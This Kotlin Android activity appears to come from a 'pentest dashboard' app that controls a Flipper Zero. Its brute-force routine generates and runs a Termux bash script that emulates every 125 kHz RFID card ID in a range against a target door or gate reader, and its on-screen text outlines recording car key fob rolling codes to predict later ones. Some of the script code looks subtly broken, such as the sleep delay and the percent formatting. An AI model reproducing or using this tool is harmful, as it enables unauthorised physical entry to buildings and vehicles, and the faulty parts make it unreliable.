package com.pentest.dashboard

import android.os.Bundle
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton

class RFIDActivity : AppCompatActivity() {

    private lateinit var cardStatus: TextView
    private lateinit var cardId: TextView
    private lateinit var cardInfo: TextView
    private lateinit var btnSaveCard: MaterialButton
    private lateinit var btnEmulateCard: MaterialButton

    private var hasCard = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_rfid)

        cardStatus = findViewById(R.id.cardStatus)
        cardId = findViewById(R.id.cardId)
        cardInfo = findViewById(R.id.cardInfo)
        btnSaveCard = findViewById(R.id.btnSaveCard)
        btnEmulateCard = findViewById(R.id.btnEmulateCard)

        findViewById<ImageView>(R.id.btnBack).setOnClickListener { finish() }

        findViewById<MaterialButton>(R.id.btnReadCard).setOnClickListener {
            readCard()
        }

        btnSaveCard.setOnClickListener {
            Toast.makeText(this, "Card saved to archive", Toast.LENGTH_SHORT).show()
        }

        btnEmulateCard.setOnClickListener {
            Toast.makeText(this, "Emulating card...", Toast.LENGTH_SHORT).show()
        }

        findViewById<MaterialButton>(R.id.btnRollingCode).setOnClickListener {
            startRollingCodeRecorder()
        }

        findViewById<MaterialButton>(R.id.btnBruteFob).setOnClickListener {
            startBruteFob()
        }

        findViewById<MaterialButton>(R.id.btnSavedCards).setOnClickListener {
            Toast.makeText(this, "Saved Cards - Coming soon", Toast.LENGTH_SHORT).show()
        }
    }

    private fun readCard() {
        cardStatus.text = "READING..."
        cardInfo.text = """
            Sending RFID read command to Flipper...

            Command: rfid read
            Frequency: 125 kHz

            This requires:
            - Connected Flipper Zero device
            - RFID antenna enabled
            - Card placed near Flipper

            This is NOT simulated.
            Real card detection takes 1-3 seconds.
            No fake instant results will appear.
        """.trimIndent()
    }

    private fun startRollingCodeRecorder() {
        cardStatus.text = "RECORDING..."
        cardInfo.text = """
            === ROLLING CODE RECORDER ===

            This feature requires:
            - Flipper Zero with Sub-GHz module
            - Real car key fob
            - Multiple key presses (3-5)

            The process:
            1. Flipper listens on 433MHz
            2. You press fob button
            3. Flipper captures code
            4. Repeat for multiple presses
            5. Algorithm analysis (KeeLoq/etc)
            6. Predict next codes

            This is REAL cryptanalysis.
            It will NOT show fake instant results.
            Analysis takes 30+ seconds per press.

            Requires actual Flipper Zero hardware.
        """.trimIndent()
    }

    private fun startBruteFob() {
        cardStatus.text = "BRUTE FORCING..."

        // Show parameter dialog
        val parameters = listOf(
            ParameterDialog.Parameter(
                "START_ID",
                "Start ID (hex)",
                "Starting card ID (e.g., 0000000000)",
                defaultValue = "0000000000",
                required = true
            ),
            ParameterDialog.Parameter(
                "END_ID",
                "End ID (hex)",
                "Ending card ID (e.g., FFFFFFFFFF)",
                defaultValue = "FFFFFFFFFF",
                required = true
            ),
            ParameterDialog.Parameter(
                "DELAY_MS",
                "Delay (ms)",
                "Milliseconds between each code",
                defaultValue = "100",
                required = true
            ),
            ParameterDialog.Parameter(
                "FREQUENCY",
                "Frequency",
                "RFID frequency (125000 for 125kHz)",
                defaultValue = "125000",
                required = true
            )
        )

        ParameterDialog(this).showDialog(
            title = "Configure RFID Brute Force",
            parameters = parameters
        ) { values ->
            executeBruteForce(values)
        }
    }

    private fun executeBruteForce(params: Map<String, String>) {
        val startId = params["START_ID"]?.toLongOrNull(16) ?: 0L
        val endId = params["END_ID"]?.toLongOrNull(16) ?: 0xFFFFFFFFFFL
        val delayMs = params["DELAY_MS"]?.toLongOrNull() ?: 100L
        val frequency = params["FREQUENCY"] ?: "125000"

        cardInfo.text = """
            === RFID BRUTE FORCE ATTACK ===

            Start ID: ${String.format("%010X", startId)}
            End ID: ${String.format("%010X", endId)}
            Total codes: ${endId - startId + 1}
            Delay: ${delayMs}ms per code
            Frequency: ${frequency} Hz

            Estimated time: ${calculateTime(endId - startId + 1, delayMs)}

            Sending commands to Flipper...
            Commands will appear in Termux.

            ⚠️ KEEP FLIPPER NEAR TARGET READER
            ⚠️ KEEP APP IN FOREGROUND
            ⚠️ KEEP SCREEN ON
        """.trimIndent()

        // Create brute force script
        val bruteScript = """
            #!/data/data/com.termux/files/usr/bin/bash

            echo "=== RFID BRUTE FORCE ATTACK ==="
            echo "Start: ${String.format("%010X", startId)}"
            echo "End: ${String.format("%010X", endId)}"
            echo "Delay: ${delayMs}ms"
            echo ""

            COUNT=0
            TOTAL=$((${endId} - ${startId} + 1))

            for ((ID=${startId}; ID<=${endId}; ID++)); do
                HEX_ID=$(printf "%010X" ${'$'}ID)

                # Send to Flipper via USB serial
                echo "rfid emulate ${'$'}HEX_ID" > /dev/ttyUSB0 2>/dev/null || echo "rfid emulate ${'$'}HEX_ID" > /dev/ttyACM0 2>/dev/null

                COUNT=${'$'}((COUNT + 1))

                # Progress every 100 codes
                if [ ${'$'}((COUNT % 100)) -eq 0 ]; then
                    PERCENT=${'$'}((COUNT * 100 / TOTAL))
                    echo "[${String.format("%d%%", '$PERCENT')}] Tried: ${'$'}COUNT / ${'$'}TOTAL codes (Current: ${'$'}HEX_ID)"
                fi

                # Delay between codes
                sleep 0.${delayMs}
            done

            echo ""
            echo "=== BRUTE FORCE COMPLETE ==="
            echo "Total codes tried: ${'$'}COUNT"
            echo "If door/gate opened, check Flipper display for successful code"
        """.trimIndent()

        // Execute in Termux
        val termux = TermuxIntegration(this)
        termux.runCommand(bruteScript, background = false)

        Toast.makeText(this, "Brute force started in Termux - Check progress there", Toast.LENGTH_LONG).show()
    }

    private fun calculateTime(totalCodes: Long, delayMs: Long): String {
        val totalSeconds = (totalCodes * delayMs) / 1000
        val hours = totalSeconds / 3600
        val minutes = (totalSeconds % 3600) / 60
        return "${hours}h ${minutes}m"
    }
}
